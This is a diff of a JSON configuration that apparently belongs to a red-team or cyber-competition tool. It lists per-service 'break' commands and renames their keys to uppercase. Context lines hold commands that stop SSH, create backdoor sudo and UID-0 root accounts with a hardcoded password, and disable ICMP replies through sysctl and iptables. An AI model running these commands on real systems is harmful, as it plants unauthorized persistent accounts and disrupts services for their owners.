@@ -43,61 +43,56 @@
     ],
     "breaks": [
         {
-            "ssh": [
+            "SSH": [
                 {
                     "Stop Service":"systemctl stop ssh",
                     "Add Sudo User":"useradd ignoreme; usermod -aG ignoreme sudo; echo -e \"ignoreme123\nignoreme123\" | passwd ignoreme",
                     "Add Root User":"useradd -ou 0 -g 0 ignmoremeroot; echo -e \"ignoreme123\nignoreme123\" | passwd ignoreme"
                 }
             ],
-            "ad":[
+            "AD":[
                 {
                     "Windows Break":"echo Windows"
                 }
             ],
-            "dns": [
+            "DNS": [
                 {
                     "Windows Break":"echo Windows"
                 }
             ],
-            "icmp":[
+            "ICMP":[
                 {
                     "Stop Ping":"echo \"1\" > /proc/sys/net/ipv4/icmp_echo_ignore_all",
                     "Persistent Stop Ping":"echo \"net.ipv4.icmp_echo_ignore_all = 1\" >> /etc/sysctl.conf; sysctl -p",
                     "IP Tables Block":"iptables -A INPUT -p icmp -j DROP; /etc/init.d/iptables save"
                 }
             ],
-            "winrm": [
+            "WINRM": [
                 {
 
                 }
             ],
-            "rdp":[
+            "RDP":[
                 {
 
                 }
             ],
-            "ldap": [
+            "LDAP": [
                 {
 
                 }
             ],
-            "http":[
+            "HTTP":[
                 {
 
                 }
             ],
-            "ftp": [
+            "FTP": [
                 {
 
                 }
             ],
-            "test":[
-                {
-                    "test":"echo test | wall"
-                }
-            ],
-            "imap":[
+            "IMAP":[
                 {
                     "test":"echo test | wall"
                 }
